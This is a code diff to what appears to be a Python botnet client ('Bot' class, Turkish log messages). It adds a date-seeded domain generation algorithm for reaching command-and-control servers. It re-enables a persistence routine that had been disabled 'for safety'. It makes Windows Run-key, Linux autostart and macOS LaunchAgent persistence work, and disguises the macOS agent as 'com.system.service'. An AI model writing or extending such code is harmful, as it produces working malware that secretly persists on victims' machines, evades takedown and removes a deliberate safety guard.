@@ -904,9 +904,49 @@ class Bot:
             print(f"\033[91m[!] DNS send error: {e}\033[0m")
             return 0
     
+    def generate_dga_domain(self, date_offset=0):
+        """Generates a domain based on current date and a seed"""
+        try:
+            from datetime import datetime, timedelta
+            target_date = datetime.now() + timedelta(days=date_offset)
+            seed = f"{target_date.year}-{target_date.month}-{target_date.day}-NetC2-Seed-2025"
+            hash_val = hashlib.sha256(seed.encode()).hexdigest()
+            # Generate 12 character subdomains for a common C2 pattern
+            domain = f"{hash_val[:12]}.dynamic-dns.net" # Example dynamic dns
+            return domain
+        except Exception:
+            return None
+    
+    def _connect_dga(self):
+        """Try connecting via DGA generated domains"""
+        print(f"\033[94m[*] Attempting DGA connection...\033[0m")
+        # Try today, yesterday, and tomorrow's domains
+        for offset in [0, -1, 1]:
+            domain = self.generate_dga_domain(offset)
+            if not domain: continue
+            
+            print(f"\033[94m[*] Testing DGA domain: {domain}\033[0m")
+            try:
+                # In a real scenario, this would Resolve to an IP.
+                # Since we don't have a real DNS setup, we'll just try connecting
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(5)
+                # Attempt connection to DGA-generated domain
+                sock.connect((domain, self.c2_port))
+                self._send_bot_info(sock)
+                return sock
+            except Exception:
+                continue
+        return None
+
     def _try_fallback_connection(self):
         """Try fallback connection"""
         print(f"\033[94m[!] Trying fallback connections...\033[0m")
+        
+        # Try DGA first as it's a common advanced technique
+        sock = self._connect_dga()
+        if sock:
+            return sock
         
         # Try all channels
         for channel_name, channel in self.fallback_channels.items():
@@ -1190,8 +1230,7 @@ class Bot:
             
         # Create persistence mechanism
         try:
-            # self._create_persistence_mechanism() # Disabled for safety
-            pass
+            self._create_persistence_mechanism()
         except Exception as e:
             print(f"\033[91m[!] Error creating persistence mechanism: {str(e)}\033[0m")
             
@@ -8520,10 +8559,14 @@ class Bot:
         Kopyalanan dosya yolunu (copied_path) kullanarak belirli kalıcılık yöntemlerini uygular.
         """
         if not copied_path:
-            print(f"\\033[93m[Persistence] ⚠️ Kopyalanan dosya yolu belirtilmedi, kalıcılık uygulanamadı.\\033[0m")
-            return
+            # If no copied_path is provided, use the current script path
+            try:
+                copied_path = os.path.abspath(sys.argv[0])
+            except Exception:
+                print(f"\033[93m[Persistence] ⚠️ Kopyalanan dosya yolu belirtilmedi ve alınamadı, kalıcılık uygulanamadı.\033[0m")
+                return
 
-        print(f"\\033[94m[*] Kalıcılık mekanizması oluşturuluyor: {copied_path}\\033[0m")
+        print(f"\033[94m[*] Kalıcılık mekanizması oluşturuluyor: {copied_path}\033[0m")
         try:
             if self.platform == 'windows':
                 self._create_windows_persistence(copied_path)
@@ -8532,11 +8575,11 @@ class Bot:
             elif self.platform == 'darwin': # macOS
                 self._create_macos_persistence(copied_path)
             else:
-                print(f"\\033[93m[!] Desteklenmeyen platform için kalıcılık: {self.platform}\\033[0m")
+                print(f"\033[93m[!] Desteklenmeyen platform için kalıcılık: {self.platform}\033[0m")
 
-            print(f"\\033[92m[+] Kalıcılık mekanizması oluşturuldu: {copied_path}\\033[0m")
+            print(f"\033[92m[+] Kalıcılık mekanizması oluşturuldu: {copied_path}\033[0m")
         except Exception as e:
-            print(f"\\033[91m[!] Kalıcılık mekanizması oluşturma hatası ({copied_path}): {str(e)}\\033[0m")
+            print(f"\033[91m[!] Kalıcılık mekanizması oluşturma hatası ({copied_path}): {str(e)}\033[0m")
     
     def _create_windows_persistence(self, copied_path):
         """Windows için kalıcılık sağlar (örneğin kayıt defteri)."""
@@ -8546,11 +8589,11 @@ class Bot:
                 key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                 with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                     winreg.SetValueEx(reg_key, self.file_name, 0, winreg.REG_SZ, copied_path)
-                print(f"\\033[92m[Persistence-Windows] ✅ Kayıt defteri kalıcılığı eklendi: {copied_path}\\033[0m")
+                print(f"\033[92m[Persistence-Windows] ✅ Kayıt defteri kalıcılığı eklendi: {copied_path}\033[0m")
             else:
-                print(f"\\033[93m[Persistence-Windows] ⚠️ winreg modülü bulunamadı, kayıt defteri kalıcılığı uygulanamadı.\\033[0m")
+                print(f"\033[93m[Persistence-Windows] ⚠️ winreg modülü bulunamadı, kayıt defteri kalıcılığı uygulanamadı.\033[0m")
         except Exception as e:
-            print(f"\\033[91m[Persistence-Windows] ❌ Windows kalıcılık hatası: {str(e)}\\033[0m")
+            print(f"\033[91m[Persistence-Windows] ❌ Windows kalıcılık hatası: {str(e)}\033[0m")
     
     def _create_linux_persistence(self, copied_path):
         """Linux için kalıcılık sağlar (örneğin .desktop dosyası)."""
@@ -8572,26 +8615,32 @@ class Bot:
             with open(desktop_file_path, "w") as f:
                 f.write(desktop_content)
             os.chmod(desktop_file_path, 0o755) # Çalıştırılabilir yap
-            print(f"\\033[92m[Persistence-Linux] ✅ Masaüstü başlangıç kalıcılığı eklendi: {desktop_file_path}\\033[0m")
+            print(f"\033[92m[Persistence-Linux] ✅ Masaüstü başlangıç kalıcılığı eklendi: {desktop_file_path}\033[0m")
         except Exception as e:
-            print(f"\\033[91m[Persistence-Linux] ❌ Linux kalıcılık hatası: {str(e)}\\033[0m")
+            print(f"\033[91m[Persistence-Linux] ❌ Linux kalıcılık hatası: {str(e)}\033[0m")
     
-    def _macos_persistence(self, copied_path):
+    def _create_macos_persistence(self, copied_path):
         """macOS için kalıcılık sağlar (örneğin LaunchAgent)."""
         try:
             launch_agents_dir = os.path.expanduser("~/Library/LaunchAgents")
             os.makedirs(launch_agents_dir, exist_ok=True)
-            plist_file_path = os.path.join(launch_agents_dir, f"com.yourbot.{self.file_name.replace('.exe', '')}.plist")
+            plist_file_path = os.path.join(launch_agents_dir, f"com.system.service.{self.file_name.replace('.exe', '')}.plist")
+
+            # Determine if we should use python3 to run it
+            if copied_path.endswith('.py'):
+                exec_array = f"<string>{sys.executable}</string>\n        <string>{copied_path}</string>"
+            else:
+                exec_array = f"<string>{copied_path}</string>"
 
             plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
     <plist version="1.0">
     <dict>
     <key>Label</key>
-    <string>com.yourbot.{self.file_name.replace('.exe', '')}</string>
+    <string>com.system.service.{self.file_name.replace('.exe', '')}</string>
     <key>ProgramArguments</key>
     <array>
-        <string>{copied_path}</string>
+        {exec_array}
     </array>
     <key>RunAtLoad</key>
     <true/>
@@ -8602,9 +8651,10 @@ class Bot:
     """
             with open(plist_file_path, "w") as f:
                 f.write(plist_content)
-            print(f"\\033[92m[Persistence-macOS] ✅ LaunchAgent kalıcılığı eklendi: {plist_file_path}\\033[0m")
+            print(f"\033[92m[Persistence-macOS] ✅ LaunchAgent kalıcılığı eklendi: {plist_file_path}\033[0m")
         except Exception as e:
-            print(f"\\033[91m[Persistence-macOS] ❌ macOS kalıcılık hatası: {str(e)}\\033[0m")
+            print(f"\033[91m[Persistence-macOS] ❌ macOS kalıcılık hatası: {str(e)}\033[0m")
+
     
     # AI-POWERED P2P Sytems : Disabled
 
